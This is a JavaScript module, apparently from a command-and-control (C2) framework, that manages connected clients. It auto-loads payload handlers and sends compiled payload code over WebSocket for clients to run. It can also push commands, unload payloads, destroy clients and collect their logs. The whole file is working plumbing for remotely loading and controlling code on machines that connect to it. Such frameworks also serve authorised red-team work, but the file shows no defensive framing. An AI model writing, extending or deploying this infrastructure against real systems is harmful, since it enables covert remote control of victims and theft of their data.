import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { WS_OPEN } from "./ws-utils.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/** Log levels accepted from clients. Anything else is coerced to "info". */
const VALID_LOG_LEVELS = new Set(["debug", "info", "warn", "error"]);

/** Maximum length of a log message before truncation. */
const MAX_LOG_MESSAGE_LENGTH = 500;

/**
 * Validates that a payload handler module exports all required methods.
 * Throws at startup if any are missing, catching misconfigured handlers early
 * rather than letting them crash at runtime when a client or viewer connects.
 *
 * Required:   initState, onViewerConnect, pushToAllViewers
 * Optional:   onMessage, onBinary, onConnect, onDisconnect
 *
 * @param {string} name - Handler name (used in the error message).
 * @param {object} handler - The imported handler module.
 */
function validateHandler(name, handler) {
  const required = ["initState", "onViewerConnect", "pushToAllViewers"];
  for (const method of required) {
    if (typeof handler[method] !== "function") {
      throw new Error(
        `Payload handler "${name}" is missing required method: ${method}`
      );
    }
  }
}

/**
 * Creates the runtime state shared between the C2 and management servers.
 * Persistent data (links, clients, logs, spider results) lives in the DB.
 * Ephemeral data (live WebSocket connections, Yjs docs, viewer sets) lives here.
 *
 * Handler discovery: all *.js files in server/payloads/ are auto-imported at startup
 * and validated against the required handler interface. Adding a new payload only
 * requires creating a new handler file — no registration step is needed.
 *
 * Protocol helpers (loadPayloadOnClient, unloadPayloadFromClient, sendPayloadMessage,
 * destroyClient) provide a single source of truth for client protocol operations,
 * used by both c2.js and management.js to avoid duplicated send logic.
 *
 * @param {ReturnType<import("./db.js").createDatabase>} db
 * @returns {Promise<object>} Resolved state object
 */
export async function createState(db) {
  // Auto-discover payload handlers from server/payloads/*.js
  const payloadsDir = path.join(__dirname, "payloads");
  const payloadHandlers = {};
  for (const file of fs
    .readdirSync(payloadsDir)
    .filter((f) => f.endsWith(".js") && !f.startsWith("_"))) {
    const name = path.basename(file, ".js");
    const handler = await import(path.join(payloadsDir, file));
    validateHandler(name, handler);
    payloadHandlers[name] = handler;
  }

  /**
   * Active client runtime state — only populated while the client WS is open.
   * Map<clientId, { ws: WebSocket, payloads: { [name]: handlerState } }>
   */
  const activeClients = new Map();

  /**
   * Live log viewer WebSocket subscriptions.
   * Set<{ ws: WebSocket, clientId: string|null }>
   */
  const logViewers = new Set();

  /**
   * Read a compiled payload bundle from dist/payloads/.
   * Returns the JS source string, or null if the file is missing.
   * @param {string} name
   */
  function readPayloadBundle(name) {
    const bundlePath = path.join(
      __dirname,
      "..",
      "dist",
      "payloads",
      `${name}.bundle.js`
    );
    try {
      return fs.readFileSync(bundlePath, "utf-8");
    } catch {
      return null;
    }
  }

  /**
   * Persist a log entry to the DB and push it to any live log viewers.
   * Sanitizes level, truncates source/message to safe lengths.
   * @param {string} clientId
   * @param {{ level: string, source: string, message: string, timestamp: number }} entry
   */
  function storeLog(clientId, entry) {
    const logEntry = {
      clientId,
      level: VALID_LOG_LEVELS.has(entry.level) ? entry.level : "info",
      source:
        typeof entry.source === "string"
          ? entry.source.slice(0, 50)
          : "unknown",
      message:
        typeof entry.message === "string"
          ? entry.message.slice(0, MAX_LOG_MESSAGE_LENGTH)
          : "",
      timestamp:
        typeof entry.timestamp === "number" ? entry.timestamp : Date.now(),
    };

    // Guard against writes after the DB is closed (e.g. disconnect event during shutdown)
    try {
      db.insertLog(
        logEntry.clientId,
        logEntry.level,
        logEntry.source,
        logEntry.message,
        logEntry.timestamp
      );
    } catch {
      return;
    }

    // Push to live log viewer subscribers
    const msg = JSON.stringify({ type: "log", entry: logEntry });
    for (const viewer of logViewers) {
      if (viewer.ws.readyState === WS_OPEN) {
        if (!viewer.clientId || viewer.clientId === clientId) {
          viewer.ws.send(msg);
        }
      }
    }
  }

  /**
   * Initialize a payload on an active client: create handler state, send load message,
   * and call the handler's onConnect hook (if defined).
   *
   * Consolidating onConnect here ensures it is always invoked regardless of the code
   * path — initial connect, reconnect, or mid-session add via PATCH /api/clients/:id.
   * Without this, mid-session adds would never set sendToClient on the handler state,
   * making viewer → client event forwarding silently broken.
   *
   * No-ops if the client is not connected or its WS is not OPEN.
   *
   * Called from: C2 handshake (initial + reconnect), PATCH /api/clients/:id (add payload).
   *
   * @param {string} clientId
   * @param {string} name - Payload name
   * @param {object} [config] - Per-payload config object included in the load message
   * @param {object} [opts]
   * @param {boolean} [opts.isReconnect=false] - True when this is a reconnecting client
   */
  function loadPayloadOnClient(clientId, name, config = {}, { isReconnect = false } = {}) {
    const entry = activeClients.get(clientId);
    if (!entry || entry.ws.readyState !== WS_OPEN) return;
    const handler = payloadHandlers[name];
    if (!handler) return;
    entry.payloads[name] = handler.initState(db, clientId, storeLog);
    const code = readPayloadBundle(name);
    if (code) {
      entry.ws.send(JSON.stringify({ type: "load", name, code, config }));
    } else {
      console.error(`  Payload bundle not found: ${name}`);
    }

    // Always call onConnect so handlers can store sendToClient and perform init logic.
    // This covers both the initial connect path and mid-session payload additions.
    if (handler.onConnect) {
      const sendToClient = (msgData) =>
        entry.ws.send(JSON.stringify({ type: "payload", name, data: msgData }));
      handler.onConnect(entry.payloads[name], { isReconnect, sendToClient });
    }
  }

  /**
   * Unload a payload from an active client: send unload message, remove handler state.
   * No-ops if the client is not connected or its WS is not OPEN.
   *
   * Called from: PATCH /api/clients/:id (remove payload).
   *
   * @param {string} clientId
   * @param {string} name - Payload name
   */
  function unloadPayloadFromClient(clientId, name) {
    const entry = activeClients.get(clientId);
    if (!entry || entry.ws.readyState !== WS_OPEN) return;
    entry.ws.send(JSON.stringify({ type: "unload", name }));
    delete entry.payloads[name];
  }

  /**
   * Forward a typed payload message to an active client's WebSocket.
   * No-ops if the client is not connected or its WS is not OPEN.
   *
   * Called from: PATCH /api/clients/:id (live config push), management routes.
   *
   * @param {string} clientId
   * @param {string} name - Payload name
   * @param {object} data - Message payload (should include a `type` field)
   */
  function sendPayloadMessage(clientId, name, data) {
    const entry = activeClients.get(clientId);
    if (!entry || entry.ws.readyState !== WS_OPEN) return;
    entry.ws.send(JSON.stringify({ type: "payload", name, data }));
  }

  /**
   * Send { type: "destroy" } to a connected client, close its WS, and remove it from
   * activeClients. No-ops gracefully if the client is not connected.
   *
   * Called from: DELETE /api/clients/:id.
   *
   * @param {string} clientId
   */
  function destroyClient(clientId) {
    const entry = activeClients.get(clientId);
    if (!entry) return;
    try {
      if (entry.ws.readyState === WS_OPEN) {
        console.log(`Client ${clientId.slice(0, 8)} sent destroy`);
        entry.ws.send(JSON.stringify({ type: "destroy" }));
      }
      entry.ws.close();
    } catch {
      // Ignore errors during forced close
    }
    activeClients.delete(clientId);
  }

  return {
    db,
    payloadHandlers,
    activeClients,
    logViewers,
    readPayloadBundle,
    storeLog,
    loadPayloadOnClient,
    unloadPayloadFromClient,
    sendPayloadMessage,
    destroyClient,
  };
}
